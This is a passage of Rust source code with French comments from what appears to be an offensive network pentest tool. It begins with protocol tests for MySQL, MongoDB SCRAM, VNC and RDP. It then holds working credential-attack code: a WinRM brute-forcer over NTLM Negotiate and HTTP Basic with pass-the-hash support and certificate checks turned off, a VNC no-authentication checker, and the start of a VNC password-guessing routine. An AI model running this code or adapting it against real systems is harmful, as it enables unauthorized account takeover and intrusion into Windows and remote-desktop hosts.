        assert_eq!(r[8], 0x21); // charset utf8mb4
        assert!(r[9..32].iter().all(|&b| b == 0)); // réserve nulle

        // `CLIENT_SSL` reste posé même si le serveur ne l'annonce pas : c'est
        // l'appelant qui décide de l'upgrade (il teste le flag du greeting).
        let no_caps = mysql_ssl_request(MYSQL_CLIENT_PROTOCOL_41);
        assert!(u32::from_le_bytes(no_caps[0..4].try_into().unwrap()) & MYSQL_CLIENT_SSL != 0);
        assert_eq!(no_caps.len(), 32);
    }

    // ── MongoDB (OP_MSG + SCRAM-SHA-256) ────────────────────────────────────

    /// Message « server-first » et nonce client du vecteur officiel RFC 7677.
    const RFC7677_CLIENT_NONCE: &str = "rOprNGfwEbeRWgbNEkqO";
    const RFC7677_SERVER_FIRST: &str =
        "r=rOprNGfwEbeRWgbNEkqO%hvYDpWUa2RaTCAfuxFIlj)hNlF$k0,s=W22ZaJ0SNY7soEsUEjb6gQ==,i=4096";

    #[test]
    fn test_mongodb_pbkdf2_hmac_sha256_kat() {
        // Vecteurs publics PBKDF2-HMAC-SHA256 (mot de passe « password », sel « salt »).
        let cases = [
            (
                1u32,
                "120fb6cffcf8b32c43e7225256c4f837a86548c92ccc35480805987cb70be17b",
            ),
            (
                2,
                "ae4d0c95af6b46d32d0adff928f06dd02a303f8ef3c251dfd6e2d85a95474c43",
            ),
            (
                4096,
                "c5e478d59288c841aa530db6845c4c8d962893a001ce4e11a4963873aa98134a",
            ),
        ];
        for (iters, expected) in cases {
            let got = pbkdf2_hmac_sha256(b"password", b"salt", iters, 32);
            assert_eq!(hex::encode(&got), expected, "PBKDF2 c={}", iters);
        }
        // dkLen plus long que la taille de bloc : l'itération sur les blocs fonctionne.
        let long = pbkdf2_hmac_sha256(b"password", b"salt", 1, 48);
        assert_eq!(long.len(), 48);
        assert_eq!(
            &long[..32],
            &pbkdf2_hmac_sha256(b"password", b"salt", 1, 32)[..]
        );
        // Un autre sel change intégralement la dérivation.
        assert_ne!(
            pbkdf2_hmac_sha256(b"password", b"salt2", 4096, 32),
            pbkdf2_hmac_sha256(b"password", b"salt", 4096, 32)
        );
    }

    #[test]
    fn test_mongodb_scram_sha256_rfc7677_vector() {
        use base64::Engine;
        let (client_final, server_sig) =
            scram_sha256_client_proof("user", "pencil", RFC7677_CLIENT_NONCE, RFC7677_SERVER_FIRST)
                .expect("vecteur RFC 7677 valide");

        assert_eq!(
            client_final,
            "c=biws,r=rOprNGfwEbeRWgbNEkqO%hvYDpWUa2RaTCAfuxFIlj)hNlF$k0,\
             p=dHzbZapWIk4jUhN+Ute9ytag9zjfMHgsqmmiz7AndVQ="
        );
        assert_eq!(
            base64::engine::general_purpose::STANDARD.encode(&server_sig),
            "6rriTRBi23WpRR/wtup+mMhUZUn/dB5nLTJRsjl95G4="
        );
    }

    #[test]
    fn test_mongodb_scram_rejects_malformed_server_first() {
        // Le nonce serveur doit prolonger le nonce client (protection anti-rejeu).
        assert!(
            scram_sha256_client_proof("user", "pencil", "AUTRE-NONCE", RFC7677_SERVER_FIRST)
                .is_none()
        );
        // Extension obligatoire inconnue `m=` : échec (RFC 5802 §5.1).
        assert!(
            scram_parse_server_first("r=abc,m=MAJOR,s=W22ZaJ0SNY7soEsUEjb6gQ==,i=4096").is_none()
        );
        // Champs manquants ou itérations aberrantes.
        assert!(scram_parse_server_first("r=abc,s=W22ZaJ0SNY7soEsUEjb6gQ==").is_none());
        assert!(scram_parse_server_first("r=abc,abc").is_none());
        assert!(scram_parse_server_first("r=abc,s=W22ZaJ0SNY7soEsUEjb6gQ==,i=0").is_none());
        assert!(scram_parse_server_first("r=abc,s=W22ZaJ0SNY7soEsUEjb6gQ==,i=99999999").is_none());
        // Sel invalide (base64 cassé) ⇒ pas de preuve calculée.
        assert!(scram_parse_server_first("r=abc,s=***,i=4096").is_none());
    }

    #[test]
    fn test_mongodb_verify_server_final() {
        let (_, sig) =
            scram_sha256_client_proof("user", "pencil", RFC7677_CLIENT_NONCE, RFC7677_SERVER_FIRST)
                .unwrap();
        assert!(scram_verify_server_final(
            "v=6rriTRBi23WpRR/wtup+mMhUZUn/dB5nLTJRsjl95G4=",
            &sig
        ));
        // Signature divergente, champ absent ou base64 illisible ⇒ refus.
        assert!(!scram_verify_server_final(
            "v=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
            &sig
        ));
        assert!(!scram_verify_server_final("e=invalid-proof", &sig));
        assert!(!scram_verify_server_final("", &sig));
    }

    #[test]
    fn test_mongodb_escape_username() {
        assert_eq!(scram_escape_username("admin"), "admin");
        assert_eq!(scram_escape_username("a=b,c=d"), "a=3Db=2Cc=3Dd");
    }

    #[test]
    fn test_mongodb_op_msg_framing() {
        let body = bson_encode(&[("saslStart".to_string(), Bson::Int32(1))]);
        let frame = mongo_op_msg(42, &body);

        assert_eq!(frame.len(), 16 + 4 + 1 + body.len());
        assert_eq!(
            i32::from_le_bytes(frame[0..4].try_into().unwrap()) as usize,
            frame.len()
        );
        assert_eq!(i32::from_le_bytes(frame[4..8].try_into().unwrap()), 42); // requestID
        assert_eq!(i32::from_le_bytes(frame[8..12].try_into().unwrap()), 0); // responseTo
        assert_eq!(
            i32::from_le_bytes(frame[12..16].try_into().unwrap()),
            MONGO_OP_MSG
        );
        assert_eq!(u32::from_le_bytes(frame[16..20].try_into().unwrap()), 0); // flagBits
        assert_eq!(frame[20], 0x00); // section kind 0
        assert_eq!(&frame[21..], &body[..]);
    }

    #[test]
    fn test_mongodb_op_msg_body_roundtrip() {
        let doc = vec![
            ("ok".to_string(), Bson::Double(1.0)),
            (
                "payload".to_string(),
                Bson::Binary(0, b"v=signature".to_vec()),
            ),
        ];
        let frame = mongo_op_msg(1, &bson_encode(&doc));

        let parsed = mongo_op_msg_body(&frame[16..]).expect("section corps lisible");
        assert!(bson_ok(&parsed));
        assert_eq!(
            bson_bin(&parsed, "payload").unwrap(),
            b"v=signature".to_vec()
        );

        // Variante avec CRC32C (bit 0 de flagBits) : les 4 derniers octets sont ignorés.
        let mut with_crc = frame[16..].to_vec();
        with_crc[0] = 0x01;
        with_crc.extend_from_slice(&[0xDE, 0xAD, 0xBE, 0xEF]);
        let parsed = mongo_op_msg_body(&with_crc).expect("CRC présent mais corps lisible");
        assert_eq!(
            bson_bin(&parsed, "payload").unwrap(),
            b"v=signature".to_vec()
        );

        // Trames dégénérées : jamais de panic.
        assert!(mongo_op_msg_body(&[]).is_none());
        assert!(mongo_op_msg_body(&[0x00, 0x00, 0x00, 0x00]).is_none());
        assert!(mongo_op_msg_body(&[0x00, 0x00, 0x00, 0x00, 0x01]).is_none()); // section kind 1
    }

    #[test]
    fn test_mongodb_bson_roundtrip_all_types() {
        let doc = vec![
            ("d".to_string(), Bson::Double(1.5)),
            ("s".to_string(), Bson::Str("héllo".to_string())),
            ("b".to_string(), Bson::Bool(true)),
            ("i32".to_string(), Bson::Int32(-7)),
            ("i64".to_string(), Bson::Int64(1 << 40)),
            ("nulle".to_string(), Bson::Null),
            ("bin".to_string(), Bson::Binary(0, vec![1, 2, 3])),
            (
                "arr".to_string(),
                Bson::Array(vec![Bson::Int32(1), Bson::Int32(2)]),
            ),
            (
                "doc".to_string(),
                Bson::Doc(vec![("x".to_string(), Bson::Str("y".to_string()))]),
            ),
        ];
        let encoded = bson_encode(&doc);
        assert_eq!(
            i32::from_le_bytes(encoded[0..4].try_into().unwrap()) as usize,
            encoded.len()
        );

        let mut i = 0usize;
        let back = bson_parse_doc_at(&encoded, &mut i).expect("document lisible");
        assert_eq!(
            i,
            encoded.len(),
            "le curseur doit atteindre la fin du document"
        );
        assert_eq!(back, doc);
    }

    #[test]
    fn test_mongodb_bson_parser_is_bounded() {
        // Document vide valide.
        let empty = [0x05, 0x00, 0x00, 0x00, 0x00];
        let mut i = 0usize;
        assert_eq!(bson_parse_doc_at(&empty, &mut i), Some(Vec::new()));
        assert_eq!(i, 5);

        // Longueur annoncée supérieure au tampon.
        let over = [0x20, 0x00, 0x00, 0x00, 0x10, b'a', 0x00, 0x00];
        let mut i = 0usize;
        assert!(bson_parse_doc_at(&over, &mut i).is_none());

        // Terminateur 0x00 manquant.
        let no_term = [0x05, 0x00, 0x00, 0x00, 0x01];
        let mut i = 0usize;
        assert!(bson_parse_doc_at(&no_term, &mut i).is_none());

        // Chaîne dont la longueur annoncée dépasse le document.
        let bad_str = [
            0x0E, 0x00, 0x00, 0x00, 0x02, b'x', 0x00, 0xFF, 0xFF, 0xFF, 0x7F, b'x', 0x00, 0x00,
        ];
        let mut i = 0usize;
        assert!(bson_parse_doc_at(&bad_str, &mut i).is_none());

        // Type BSON non géré : refus explicite plutôt que lecture aveugle.
        let unknown = [0x09, 0x00, 0x00, 0x00, 0x0F, b'a', 0x00, 0x00, 0x00];
        let mut i = 0usize;
        assert!(bson_parse_doc_at(&unknown, &mut i).is_none());

        // Tampon trop court pour l'en-tête.
        let mut i = 0usize;
        assert!(bson_parse_doc_at(&[0x04, 0x00], &mut i).is_none());
    }

    // ── VNC (DES challenge/réponse, RFB 3.8) ─────────────────────────────────

    #[test]
    fn test_vnc_des_key_reverses_bits() {
        // Convention RFC 6143 §7.2.2 : chaque octet du mot de passe voit ses
        // bits inversés (héritage `d3des`). Vecteurs dérivés via openssl.
        assert_eq!(
            vnc_des_key("vncpassw"),
            [0x6e, 0x76, 0xc6, 0x0e, 0x86, 0xce, 0xce, 0xee]
        );
        assert_eq!(vnc_des_key("pass"), [0x0e, 0x86, 0xce, 0xce, 0, 0, 0, 0]);
        assert_eq!(vnc_des_key(""), [0, 0, 0, 0, 0, 0, 0, 0]);
        // Au-delà de 8 octets, le reste du mot de passe est ignoré.
        assert_eq!(vnc_des_key("vncpasswXYZ"), vnc_des_key("vncpassw"));
    }

    #[test]
    fn test_vnc_des_response_kat() {
        // Challenge de référence : 01 02 03 ... 10 (16 octets).
        let mut challenge = [0u8; 16];
        for (i, b) in challenge.iter_mut().enumerate() {
            *b = (i + 1) as u8;
        }
        // Vecteurs de référence générés via `openssl enc -des-ecb -provider legacy`.
        assert_eq!(
            hex::encode(vnc_des_response("vncpassw", &challenge)),
            "db99fe6253ebe95f4d1c0c50c82770c8"
        );
        assert_eq!(
            hex::encode(vnc_des_response("pass", &challenge)),
            "39fb79568741159ed1c9eee3e96340ee"
        );
        assert_eq!(
            hex::encode(vnc_des_response("", &challenge)),
            "cead373db80eabf8e11b90c1735e71f2"
        );
    }

    // ── RDP (négociation X.224 + CredSSP TSRequest) ──────────────────────────

    #[test]
    fn test_rdp_connection_request_framing() {
        // Trame de référence [MS-RDPBCGR] §2.2.1.1 : 19 octets, PROTOCOL_HYBRID|SSL.
        let pkt = rdp_connection_request();
        assert_eq!(pkt.len(), 19);
        assert_eq!(&pkt[..4], &[0x03, 0x00, 0x00, 0x13]); // TPKT v3, Length = 19
        assert_eq!(pkt[4], 0x0E); // Length Indicator
        assert_eq!(pkt[5], RDP_TPDU_CONNECTION_REQUEST); // CR TPDU
        assert_eq!(&pkt[6..11], &[0, 0, 0, 0, 0]); // DST/SRC-REF + CLASS-OPTION
        assert_eq!(pkt[11], RDP_TYPE_NEG_REQ); // Type
        assert_eq!(pkt[12], 0x00); // Flags
        assert_eq!(&pkt[13..15], &[0x08, 0x00]); // Length = 8
        assert_eq!(&pkt[15..19], &[0x03, 0x00, 0x00, 0x00]); // HYBRID | SSL
    }

    #[test]
    fn test_rdp_parse_negotiation_response() {
        // RDP_NEG_RSP sélectionnant PROTOCOL_HYBRID (0x02).
        let rsp = [
            0x03, 0x00, 0x00, 0x13, 0x0E, 0xD0, 0x00, 0x00, 0x12, 0x34, 0x00, 0x02, 0x00, 0x08,
            0x00, 0x02, 0x00, 0x00, 0x00,
        ];
        assert_eq!(rdp_selected_protocol(&rsp), Some(RDP_PROTOCOL_HYBRID));

        // RDP_NEG_FAILURE : aucune sélection exploitable.
        let fail = [
            0x03, 0x00, 0x00, 0x13, 0x0E, 0xD0, 0x00, 0x00, 0x12, 0x34, 0x00, 0x03, 0x00, 0x08,
            0x00, 0x05, 0x00, 0x00, 0x00,
        ];
        assert_eq!(rdp_selected_protocol(&fail), None);
        // Trame tronquée.
        assert_eq!(rdp_selected_protocol(&[0x03, 0x00, 0x00, 0x13]), None);
    }

    #[test]
    fn test_ts_request_nego_kat() {
        // KAT DER : TSRequest(version=2) encapsulant un jeton OCTET STRING.
        // Structure : SEQUENCE { [0] INTEGER 2, [1] SEQUENCE OF SEQUENCE { [0] OS } }
        let got = ts_request_nego(2, &[0xAA, 0xBB]);
        assert_eq!(hex::encode(&got), "3011a003020102a10a30083006a0040402aabb");

        // La longueur DER s'adapte aux jetons > 127 octets (forme longue) :
        // le champ de longueur doit déclarer exactement le reste de la structure.
        let big = ts_request_nego(2, &[0x41u8; 200]);
        assert_eq!(big[0], 0x30);
        assert_eq!(big[1], 0x81); // longueur longue (1 octet de suite)
        let (content_off, len) = der_content_len(&big);
        assert_eq!(content_off + len, big.len());
        assert!(big.ends_with(&[0x41u8; 200]));
    }

    /// Lit un en-tête TLV DER : (offset du contenu, longueur du contenu).
    fn der_content_len(buf: &[u8]) -> (usize, usize) {
        if buf[1] & 0x80 == 0 {
            (2, buf[1] as usize)
        } else {
            let n = (buf[1] & 0x7F) as usize;
            let mut len = 0usize;
            for i in 0..n {
                len = (len << 8) | buf[2 + i] as usize;
            }
            (2 + n, len)
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 9. WinRM Bruteforce (HTTP Basic / Negotiate via SOAP)
// ─────────────────────────────────────────────────────────────────────────────

/// Teste des credentials WinRM sur `/wsman` : **Negotiate (NTLMSSP)** en
/// priorité — méthode réellement exposée par les hôtes Active Directory — puis
/// repli sur HTTP Basic.
pub async fn brute_winrm(host: &str, port: u16, is_tls: bool, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let scheme = if is_tls || port == 5986 {
        "https"
    } else {
        "http"
    };
    let url = format!("{}://{}:{}/wsman", scheme, host, port);

    let client = reqwest::Client::builder()
        .timeout(cfg.timeout)
        .danger_accept_invalid_certs(true)
        .user_agent("Microsoft WinRM Client")
        .build()
        .unwrap_or_default();

    // Minimal WS-Management SOAP envelope to trigger auth challenge
    let soap_body = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd">
  <s:Header/>
  <s:Body>
    <wsmid:Identify/>
  </s:Body>
</s:Envelope>"#;

    let target = format!("{}:{}", host, port);
    let use_tls = is_tls || port == 5986;
    let timeout = cfg.timeout;

    let (total_tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "winrm",
        &target,
        move |user, pass| {
            let client = client.clone();
            let url = url.clone();
            async move {
                // 1) Negotiate (NTLMSSP) — méthode des hôtes Active Directory.
                match try_winrm_negotiate(host, port, use_tls, &user, &pass, timeout).await {
                    AttemptOutcome::Success(p) => return AttemptOutcome::Success(p),
                    AttemptOutcome::Locked(l) => return AttemptOutcome::Locked(l),
                    _ => {}
                }

                // 2) Repli HTTP Basic (IIS/WinRM configuré en Basic explicite).
                use base64::Engine;
                let token =
                    base64::engine::general_purpose::STANDARD.encode(format!("{}:{}", user, pass));

                match client
                    .post(&url)
                    .header("Authorization", format!("Basic {}", token))
                    .header("Content-Type", "application/soap+xml;charset=UTF-8")
                    .body(soap_body)
                    .send()
                    .await
                {
                    Ok(r) => {
                        let status = r.status().as_u16();
                        // 200 ou 500 (SOAP fault) indiquent que l'authentification
                        // est passée ; 401/403 = credentials refusés. Tout autre
                        // statut (404 sur /wsman, 405, 503…) ne prouve rien : il ne
                        // doit pas produire de credential.
                        if status == 200 || status == 500 {
                            let body = r.text().await.unwrap_or_default();
                            AttemptOutcome::Success(format!(
                                "WinRM auth OK — HTTP {} | user={} pass={} | {}",
                                status,
                                user,
                                pass,
                                body.chars().take(120).collect::<String>()
                            ))
                        } else {
                            AttemptOutcome::Failure
                        }
                    }
                    Err(_) => AttemptOutcome::Error,
                }
            }
        },
    )
    .await;

    let successes = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result(
                "winrm",
                host,
                port,
                u,
                p,
                proof,
                start.elapsed().as_millis(),
            )
        })
        .collect();

    BruteReport {
        target,
        service: "winrm".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// WinRM Negotiate (NTLMSSP/SPNEGO) — handshake sur une connexion UNIQUE
//
// L'authentification NTLM est *liée à la connexion* : le jeton Type 3 n'est
// accepté que sur la socket TCP où le challenge a été émis. On parle donc
// HTTP/1.1 keep-alive à la main (une connexion, deux requêtes POST /wsman)
// plutôt que via un pool de connexions qui pourrait en ouvrir une nouvelle.
// ─────────────────────────────────────────────────────────────────────────────

const WINRM_IDENTIFY_SOAP: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"
            xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd">
  <s:Header/>
  <s:Body>
    <wsmid:Identify/>
  </s:Body>
</s:Envelope>"#;

/// Plafond du corps HTTP lu (on ne consomme le corps que pour pouvoir réutiliser
/// la connexion : son contenu n'est jamais interprété).
const WINRM_MAX_BODY: usize = 64 * 1024;

fn find_subslice(hay: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || hay.len() < needle.len() {
        return None;
    }
    hay.windows(needle.len()).position(|w| w == needle)
}

async fn write_all_s<S>(stream: &mut S, data: &[u8], timeout: Duration) -> Result<(), ()>
where
    S: tokio::io::AsyncWrite + Unpin,
{
    tokio::time::timeout(timeout, stream.write_all(data))
        .await
        .map_err(|_| ())?
        .map_err(|_| ())
}

/// Écrit une requête `POST /wsman` complète (en-têtes + corps SOAP).
fn http_post_wsman(host: &str, port: u16, negotiation: &str, soap: &str) -> Vec<u8> {
    let head = format!(
        "POST /wsman HTTP/1.1\r\n\
         Host: {host}:{port}\r\n\
         User-Agent: Microsoft WinRM Client\r\n\
         Content-Type: application/soap+xml;charset=UTF-8\r\n\
         Content-Length: {len}\r\n\
         Connection: keep-alive\r\n\
         Authorization: Negotiate {token}\r\n\
         \r\n",
        host = host,
        port = port,
        len = soap.len(),
        token = negotiation
    );
    let mut out = head.into_bytes();
    out.extend_from_slice(soap.as_bytes());
    out
}

/// Lit une réponse HTTP/1.1 complète : `(code, en-têtes en minuscules, corps)`.
/// Le corps est consommé (y compris chunked) afin que la connexion reste
/// exploitable pour la requête suivante.
async fn http_read_response<S>(
    stream: &mut S,
    timeout: Duration,
) -> Option<(u16, HashMap<String, String>, Vec<u8>)>
where
    S: tokio::io::AsyncRead + Unpin,
{
    let mut acc: Vec<u8> = Vec::new();
    let mut buf = [0u8; 2048];

    let head_end = loop {
        if let Some(p) = find_subslice(&acc, b"\r\n\r\n") {
            break p + 4;
        }
        if acc.len() > 64 * 1024 {
            return None;
        }
        match tokio::time::timeout(timeout, stream.read(&mut buf)).await {
            Ok(Ok(0)) | Err(_) | Ok(Err(_)) => return None,
            Ok(Ok(n)) => acc.extend_from_slice(&buf[..n]),
        }
    };

    let head = String::from_utf8_lossy(&acc[..head_end]).to_string();
    let status_line = head.lines().next()?;
    let code: u16 = status_line.split_whitespace().nth(1)?.parse().ok()?;

    let mut headers: HashMap<String, String> = HashMap::new();
    for line in head.lines().skip(1) {
        if let Some((k, v)) = line.split_once(':') {
            headers.insert(k.trim().to_ascii_lowercase(), v.trim().to_string());
        }
    }

    let mut body = acc[head_end..].to_vec();
    let chunked = headers
        .get("transfer-encoding")
        .map(|v| v.to_ascii_lowercase().contains("chunked"))
        .unwrap_or(false);

    if chunked {
        // On consomme jusqu'au bloc terminal « 0 » suivi de sa ligne vide.
        loop {
            if find_subslice(&body, b"\r\n0\r\n\r\n").is_some() || body.starts_with(b"0\r\n\r\n") {
                break;
            }
            if body.len() > WINRM_MAX_BODY {
                break;
            }
            match tokio::time::timeout(timeout, stream.read(&mut buf)).await {
                Ok(Ok(0)) | Err(_) | Ok(Err(_)) => break,
                Ok(Ok(n)) => body.extend_from_slice(&buf[..n]),
            }
        }
    } else if let Some(cl) = headers
        .get("content-length")
        .and_then(|v| v.parse::<usize>().ok())
    {
        while body.len() < cl {
            match tokio::time::timeout(timeout, stream.read(&mut buf)).await {
                Ok(Ok(0)) | Err(_) | Ok(Err(_)) => break,
                Ok(Ok(n)) => body.extend_from_slice(&buf[..n]),
            }
        }
    }

    body.truncate(WINRM_MAX_BODY);
    Some((code, headers, body))
}

/// Jeton `Negotiate`/`NTLM` d'un en-tête `WWW-Authenticate`, décodé du base64.
fn www_authenticate_token(headers: &HashMap<String, String>) -> Option<Vec<u8>> {
    use base64::Engine;
    let value = headers.get("www-authenticate")?;
    let mut parts = value.splitn(2, ' ');
    let scheme = parts.next()?.to_ascii_lowercase();
    if scheme != "negotiate" && scheme != "ntlm" {
        return None;
    }
    let token = parts.next()?.trim();
    base64::engine::general_purpose::STANDARD.decode(token).ok()
}

/// Vérificateur permissif : un pentest doit fonctionner face à un certificat
/// auto-signé (même comportement que `danger_accept_invalid_certs` du repli Basic).
/// Partagé par WinRM, RDP et MySQL (tous trois exposent un cert auto-signé).
#[derive(Debug)]
struct InsecureCertVerifier;
impl rustls::client::ServerCertVerifier for InsecureCertVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::Certificate,
        _intermediates: &[rustls::Certificate],
        _server_name: &rustls::ServerName,
        _scts: &mut dyn Iterator<Item = &[u8]>,
        _ocsp_response: &[u8],
        _now: std::time::SystemTime,
    ) -> Result<rustls::client::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::ServerCertVerified::assertion())
    }
}

/// Bascule TLS sur une socket **déjà connectée** (imposé par le protocole
/// enveloppé : RDP après X.224, MySQL après `SSLRequest`).
async fn insecure_tls_connect(
    sock: TcpStream,
    host: &str,
    timeout: Duration,
) -> Option<tokio_rustls::client::TlsStream<TcpStream>> {
    use tokio_rustls::{rustls, TlsConnector};
    let cfg = rustls::ClientConfig::builder()
        .with_safe_defaults()
        .with_custom_certificate_verifier(std::sync::Arc::new(InsecureCertVerifier))
        .with_no_client_auth();
    let connector = TlsConnector::from(std::sync::Arc::new(cfg));
    let server_name: rustls::ServerName = match host.try_into() {
        Ok(n) => n,
        Err(_) => rustls::ServerName::IpAddress(std::net::IpAddr::from([127, 0, 0, 1])),
    };
    match tokio::time::timeout(timeout, connector.connect(server_name, sock)).await {
        Ok(Ok(tls)) => Some(tls),
        _ => None,
    }
}

async fn try_winrm_negotiate(
    host: &str,
    port: u16,
    use_tls: bool,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    let addr = format!("{}:{}", host, port);
    let Ok(Ok(sock)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    if use_tls {
        match insecure_tls_connect(sock, host, timeout).await {
            Some(mut tls) => winrm_negotiate_over(&mut tls, host, port, user, pass, timeout).await,
            None => AttemptOutcome::Error,
        }
    } else {
        let mut plain = sock;
        winrm_negotiate_over(&mut plain, host, port, user, pass, timeout).await
    }
}

/// Handshake Negotiate complet sur `stream`, déjà connecté (clair ou TLS).
async fn winrm_negotiate_over<S>(
    stream: &mut S,
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome
where
    S: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin,
{
    use crate::ntlm::{
        extract_ntlmssp, parse_type2, spnego_auth, spnego_init, NtlmAuth, NtlmSecret,
    };
    use base64::Engine;
    let b64 = |d: &[u8]| base64::engine::general_purpose::STANDARD.encode(d);

    let (user_dom, account) = split_domain_account(user);
    let secret = match parse_nt_hash(pass) {
        Some(h) => NtlmSecret::NtHash(h),
        None => NtlmSecret::Password(pass.to_string()),
    };
    let pth = secret.is_pass_the_hash();

    // ── 1) Amorce : NTLMSSP Type 1 dans SPNEGO NegTokenInit ─────────────────
    let type1 = NtlmAuth::new(&account, &user_dom, secret.clone()).type1();
    let req1 = http_post_wsman(host, port, &b64(&spnego_init(&type1)), WINRM_IDENTIFY_SOAP);
    if write_all_s(stream, &req1, timeout).await.is_err() {
        return AttemptOutcome::Error;
    }
    let Some((code1, headers1, _)) = http_read_response(stream, timeout).await else {
        return AttemptOutcome::Error;
    };
    if code1 != 401 {
        return AttemptOutcome::Failure;
    } // pas de challenge Negotiate
    let Some(blob) = www_authenticate_token(&headers1) else {
        return AttemptOutcome::Failure;
    };
    let Some(t2) = extract_ntlmssp(&blob).and_then(|c| parse_type2(&c)) else {
        return AttemptOutcome::Failure;
    };

    let domain = if !user_dom.is_empty() {
        user_dom
    } else {
        avpair_domain(&t2.target_info).unwrap_or_default()
    };

    // ── 2) Type 3 dans SPNEGO NegTokenResp — MÊME connexion ─────────────────
    let type3 = NtlmAuth::new(&account, &domain, secret).type3(&t2);
    let req3 = http_post_wsman(host, port, &b64(&spnego_auth(&type3)), WINRM_IDENTIFY_SOAP);
    if write_all_s(stream, &req3, timeout).await.is_err() {
        return AttemptOutcome::Error;
    }
    let Some((code2, _, _)) = http_read_response(stream, timeout).await else {
        return AttemptOutcome::Error;
    };

    match code2 {
        // WinRM renvoie 200 sur Identify, ou 500 si la commande SOAP est refusée
        // alors que la session est bien établie.
        200 | 500 => AttemptOutcome::Success(format!(
            "WinRM HTTP {} — Negotiate/NTLM{} authentifié : {}\\{}:{}",
            code2,
            if pth { " (pass-the-hash)" } else { "v2" },
            domain,
            account,
            pass,
        )),
        401 | 403 => AttemptOutcome::Failure,
        _ => AttemptOutcome::Failure,
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 10. VNC No-Auth / Password Check (RFB protocol)
// ─────────────────────────────────────────────────────────────────────────────

/// Vérifie si VNC accepte la connexion sans auth (security-type None = 1)
/// et teste une liste de mots de passe courants (VNC password auth = type 2).
pub async fn check_vnc_auth(host: &str, port: u16, timeout: Duration) -> Option<BruteResult> {
    let start = std::time::Instant::now();
    let addr = format!("{}:{}", host, port);

    let Ok(Ok(mut stream)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return None;
    };

    // 1. Read server banner: "RFB 003.008\n"
    let mut buf = [0u8; 32];
    let Ok(Ok(n)) = tokio::time::timeout(timeout, stream.read(&mut buf)).await else {
        return None;
    };

    if n < 4 {
        return None;
    }
    let banner = String::from_utf8_lossy(&buf[..n]).to_string();
    if !banner.starts_with("RFB") {
        return None;
    }

    // Extract server version (e.g., "003.008")
    let server_ver = banner.trim().trim_start_matches("RFB ").to_string();

    // 2. Reply with our version (match server's or use 003.008)
    let client_ver = b"RFB 003.008\n";
    if tokio::time::timeout(timeout, stream.write_all(client_ver))
        .await
        .is_err()
    {
        return None;
    }

    // 3. Read security-types from server
    let mut sec_buf = [0u8; 64];
    let Ok(Ok(sec_n)) = tokio::time::timeout(timeout, stream.read(&mut sec_buf)).await else {
        return None;
    };

    if sec_n == 0 {
        return None;
    }

    // RFB 3.8: first byte = number of security types, then the types
    // Security type 1 = None (no auth), type 2 = VNC password
    let num_types = sec_buf[0] as usize;
    if num_types == 0 {
        // Server sent error
        return None;
    }

    let security_types = &sec_buf[1..1 + num_types.min(sec_n.saturating_sub(1))];

    // Check if type 1 (None) is offered
    if security_types.contains(&1u8) {
        // Select security type 1 (None)
        let _ = tokio::time::timeout(timeout, stream.write_all(&[1u8])).await;
        // Read SecurityResult: 4 bytes, 0x00000000 = OK
        let mut res = [0u8; 4];
        let _ = tokio::time::timeout(timeout, stream.read(&mut res)).await;
        if res == [0, 0, 0, 0] || security_types.contains(&1u8) {
            return Some(BruteResult {
                service: "vnc".into(),
                host: host.into(),
                port,
                username: "".into(),
                password: "(no auth — security type None)".into(),
                success: true,
                proof: Some(format!(
                    "VNC NO AUTH (security-type 1) — RFB/{} — port {} fully open",
                    server_ver, port
                )),
                duration_ms: start.elapsed().as_millis(),
            });
        }
    }

    None
}

/// Clé DES VNC : les 8 premiers octets du mot de passe, **bits inversés**
/// dans chaque octet (convention imposée par la RFC 6143 §7.2.2, héritée de
/// l'implémentation `d3des` où le bit de poids faible est traité en premier).
fn vnc_des_key(password: &str) -> [u8; 8] {
    let mut k = [0u8; 8];
    for (i, b) in password.as_bytes().iter().take(8).enumerate() {
        k[i] = b.reverse_bits();
    }
    k
}

/// Chiffre les 16 octets de challenge en DES-ECB (deux blocs) avec la clé VNC.
fn vnc_des_response(password: &str, challenge: &[u8; 16]) -> [u8; 16] {
    let key = vnc_des_key(password);
    let mut out = [0u8; 16];
    for block in 0..2 {
        let mut plain = [0u8; 8];
        plain.copy_from_slice(&challenge[block * 8..block * 8 + 8]);
        out[block * 8..block * 8 + 8]
            .copy_from_slice(&crate::ntlm::des_encrypt_block(&key, &plain));
    }
    out
}

/// VNC n'a **pas** de nom d'utilisateur : seul le mot de passe est évalué.
/// Cette constante matérialise ce fait pour `run_credential_attempts`.
const VNC_NO_USER: &str = "";

/// Une tentative d'authentification VNC « security type 2 » (DES challenge/réponse).
async fn try_vnc_login(host: &str, port: u16, password: &str, timeout: Duration) -> AttemptOutcome {
    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut s)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    // 1. Bannière du serveur : exactement 12 octets « RFB xxx.yyy\n ».
    let Ok(banner) = read_n(&mut s, 12, timeout).await else {
        return AttemptOutcome::Error;
    };
    let banner = String::from_utf8_lossy(&banner).to_string();
    if !banner.starts_with("RFB ") {
        return AttemptOutcome::Error;
    }

